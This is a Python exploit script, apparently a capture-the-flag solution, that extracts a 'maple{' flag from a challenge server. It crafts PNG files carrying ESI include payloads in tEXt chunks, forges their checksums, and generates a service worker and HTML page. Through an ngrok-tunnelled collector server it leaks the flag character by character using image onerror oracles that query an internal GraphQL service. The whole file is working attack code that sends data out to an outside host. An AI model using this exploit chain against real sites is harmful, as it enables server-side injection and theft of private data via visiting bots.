#python3
import os
from time import sleep
import png
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from pyngrok import ngrok
import threading
import string
import json
from typing import List
from io import BytesIO
import base64
from urllib.parse import quote_plus
import struct
import requests

# requires ngrok, on top of python and required packages

TEXT_CHUNK_FLAG = b'tEXt'
PORT_TO_SERVE_FROM = 8000
CHAL_DOMAIN = "https://nginx:443"
INTERNAL_GRAPHQL = "http://jjk_db"
EXPLOIT_DIR = "/".join(__file__.split("/")[:-1])
BASE_PNG = EXPLOIT_DIR + "/base.png"
WIN_QUERY = '''{
    getCharacters(
        filters: {
            notesLike: "%FLAG_SO_FAR%"
        }) {
        edges {
            node {
                name,
                notes
            }
        } 
    }
}'''
EMPTY_QUERY_RES = '{"data":{"getCharacters":{"edges":[]}}}'
OUR_DOMAIN = "UNINITIALIZED"
FLAG_CHARSET = string.ascii_lowercase + string.digits + "}{"

current_flag = "maple{"
poll_status = False

def main():
    global current_flag
    global poll_status
    global OUR_DOMAIN
    # set current working directory to where this file is, jic
    os.chdir(EXPLOIT_DIR)
    
    # ngrok http <PORT> equivalent
    tunnel = ngrok.connect(PORT_TO_SERVE_FROM)
    our_domain = tunnel.public_url
    # our_domain = f"http://localhost:{PORT_TO_SERVE_FROM}"
    OUR_DOMAIN = our_domain
    print("Our domain is: " + OUR_DOMAIN)

    # python3 -m http.server <PORT> equivalent
    file_server = ThreadingHTTPServer(('localhost', PORT_TO_SERVE_FROM), Collector)
    file_server_thread = threading.Thread(target=file_server.serve_forever)
    file_server_thread.daemon = True
    file_server_thread.start()    # get ready for first poll

    setup(current_flag)
    poll_status = True
    
    # feed bot (local test)
    # r = requests.post('http://localhost:80/visit', data={
    #     "url": f"{our_domain}/orchestrator.html"
    # })
    
    file_server_thread.join()
    ngrok.disconnect(our_domain)
    
def setup(cur_flag): # onerror is called if NOT flag
    exfil_js = [
        f"""let hexcode = this.src.slice(-2);""",
        f"""hexcode = String.fromCharCode(parseInt(hexcode, 16));""",
        f"""window.foundChars.push(hexcode);""",
        f"""window.images += 1;""",
    ]
    assert("'" not in exfil_js)
    exfil_js = "\n".join(exfil_js)
    png_dict = {}
    # first, create a 'correct' png that we'll use as reference
    # we'll want its checksum
    valid_oracle_png = inject_png_text_chunk(BASE_PNG, EMPTY_QUERY_RES)
    valid_oracle_png = base64.b64decode(valid_oracle_png)
    idx = valid_oracle_png.find(bytes(EMPTY_QUERY_RES, "utf-8"))
    idx += len(EMPTY_QUERY_RES)
    valid_checksum = valid_oracle_png[idx:idx + 4]
    for c in FLAG_CHARSET:
        esi_payload = f"""<esi:include src='{INTERNAL_GRAPHQL}/?query={quote_plus(WIN_QUERY.strip().replace("FLAG_SO_FAR", cur_flag + c))}'  onerror='continue'/>"""
        modified_png = inject_png_text_chunk(BASE_PNG, esi_payload)
        modified_png = modify_checksum_and_length_of_png(modified_png, esi_payload, valid_checksum, len(EMPTY_QUERY_RES))
        png_dict[c] = modified_png
    img_src_loop = []
    png_dict_str = []
    with open(EXPLOIT_DIR + "/sw_base.js", "r") as f:
        base_js = f.read()
        base_js = base_js
        base_js = base_js.replace("DOMAIN_PLACEHOLDER", OUR_DOMAIN)
        base_js = base_js.replace("TARGET_PLACEHOLDER", CHAL_DOMAIN)
        for k, v in png_dict.items():
            hexcode = hex(ord(k))[2:]
            if len(hexcode) == 1:
                hexcode = "0" + hexcode
            png_dict_str.append(f"'{hexcode}': '{v}',")
            img_src_loop.append(f"/intercept{hexcode}")
        base_js = base_js.replace("/* INSERT PNG DICT HERE */", "\n".join(png_dict_str))
    with open(f"{EXPLOIT_DIR}/sw.js", "w") as g:
        g.write(base_js)
    with open(EXPLOIT_DIR + "/index_base.html", "r") as f:
        base_html = f.read()
        new_html = base_html
        new_html = new_html.replace("IMG_PLACEHOLDER", f"<img src='SRC_PLACEHOLDER' onerror='{exfil_js}' onload='window.images += 1;' />")
        new_html = new_html.replace("/* IMAGE SRC PLACEHOLDER */", ",".join([f"'{x}'" for x in img_src_loop]))
        with open(f"{EXPLOIT_DIR}/index.html", "w") as g:
            g.write(new_html) 
    return
    
# utility functions
# modified http.server that also functions as away for us to receive flag and coordinate with admin

class Collector(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def do_POST(self):
        global current_flag
        global poll_status
        # special case if path is /poll
        if self.path == "/poll":
            if poll_status:
                poll_status = False
                self.send_response(200)
                self.send_header('Content-Type', "text/plain")
                self.end_headers()
                self.wfile.write(b"1")
            else:
                self.send_response(201)
                self.send_header('Content-Type', "text/plain")
                self.end_headers()
                self.wfile.write(b"0")
        elif self.path == "/fail":
            self.send_response(201)
            self.send_header('Content-Type', "text/plain")
            self.end_headers()
            self.wfile.write(b"aw")
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            num_onerrors = int(post_data.decode("utf-8"), 10)
            print(f"failed to get flag, got {num_onerrors} onerrors") 
            if num_onerrors == 0:
                print("retrying...")
                current_flag = current_flag[:-1]
                setup(current_flag)
                sleep(0.5)
                poll_status = True
        else:
            if poll_status is False:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                current_flag += post_data.decode("utf-8")
                print(current_flag)
                setup(current_flag)
                sleep(0.5) # give setup some time to actually flush the file
                self.send_response(200)
                self.send_header('Content-Type', "text/plain")
                self.end_headers()
                self.wfile.write(b"owo")
                # proceed to setup again
                poll_status = True
            elif poll_status is True:
                # ignore the request, and log warning
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                print("Warning, received multiple flag candidates " + current_flag + post_data.decode("utf-8"))
                self.send_response(200)
                self.send_header('Content-Type', "text/plain")
                self.end_headers()
                self.wfile.write(b"nowo")
            
        

def generate_text_chunk_tuple(str_info):
    type_flag = TEXT_CHUNK_FLAG
    return tuple([type_flag, bytes(str_info, 'utf-8')])


def inject_png_text_chunk(src_img, text_to_inject, chunk_idx=1):
    if chunk_idx < 0:
        raise Exception('The index value {} less than 0!'.format(chunk_idx))

    reader = png.Reader(filename=src_img)
    chunks = reader.chunks()
    chunk_list = list(chunks)
    chunk_item = generate_text_chunk_tuple(text_to_inject)
    chunk_list.insert(chunk_idx, chunk_item)
    
    file_io = BytesIO()
    png.write_chunks(file_io, chunk_list)
    file_io.seek(0)
    res = file_io.read()
    encoded = base64.b64encode(res).decode('utf-8')
    return encoded

def modify_checksum_and_length_of_png(b64encoded, payload, new_checksum, length):
    decoded = base64.b64decode(b64encoded)
    esi_payload_as_bytes = bytes(payload, "utf-8")
    idx_of_text_chk = decoded.find(esi_payload_as_bytes)
    idx_of_text_chk += len(payload)
    decoded = decoded[:idx_of_text_chk] + new_checksum + decoded[idx_of_text_chk + 4:]
    
    idx_of_type = decoded.find(TEXT_CHUNK_FLAG)
    idx_of_length = idx_of_type - 4
    length_as_bytes = struct.pack(">I", length)
    decoded = decoded[:idx_of_length] + length_as_bytes + decoded[idx_of_length + 4:]
    
    return base64.b64encode(decoded).decode("utf-8")

if __name__ == "__main__":
    main()